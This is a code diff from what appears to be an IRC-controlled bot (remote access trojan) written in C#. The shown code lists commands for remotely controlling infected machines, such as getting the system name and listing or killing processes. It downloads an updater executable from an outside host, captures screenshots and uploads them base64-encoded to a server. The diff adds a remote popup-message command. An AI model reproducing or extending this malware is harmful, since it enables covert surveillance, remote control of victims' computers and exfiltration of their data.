@@ -35,6 +35,7 @@ namespace tom
             irc.SendMessage("Message all bots");
             irc.SendMessage("     [all] v* [command]");
             irc.SendMessage("COMMANDS for " + irc.VERSION);
+            irc.SendMessage("     alert [message]   --message popup box on host machine");
             irc.SendMessage("     name              --get system name");
             irc.SendMessage("     processes         --lists all processes");
             irc.SendMessage("     kill [process]    --kill process by name");
@@ -51,6 +52,14 @@ namespace tom
             Client.DownloadFile("http://www.jaredeverett.ca/bots/BotUpdater.exe", @Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
 
             return "probably failed";
+        }
+        
+        public void ShowMessage(string message)
+        {
+            const string caption = "Alert";
+            var result = MessageBox.Show(message, caption,
+                                         MessageBoxButtons.OK,
+                                         MessageBoxIcon.Information);
         }
 
         public void ListProcesses()
@@ -127,9 +136,9 @@ namespace tom
             bmpScreenshot.Save("test.jpg", ImageFormat.Jpeg);
 
             // *** Send to server
-
+            String temp = System.IO.Path.GetDirectoryName(Application.ExecutablePath) + "\\test.jpg";
             // Load a image
-            System.Drawing.Image myImage = GetImage(System.IO.Path.GetDirectoryName(Application.ExecutablePath) + "/test.jpg");
+            System.Drawing.Image myImage = GetImage(System.IO.Path.GetDirectoryName(Application.ExecutablePath) + "\\test.jpg");
 
             // Convert to base64 encoded string
             string base64Image = ImageToBase64(myImage, System.Drawing.Imaging.ImageFormat.Jpeg);
@@ -142,7 +151,7 @@ namespace tom
                     { "myImageData", base64Image }
                 });
 
-                irc.SendMessage("Server Said: " + System.Text.Encoding.Default.GetString(response));
+                irc.SendMessage(System.Text.Encoding.Default.GetString(response));
             }
         }
 
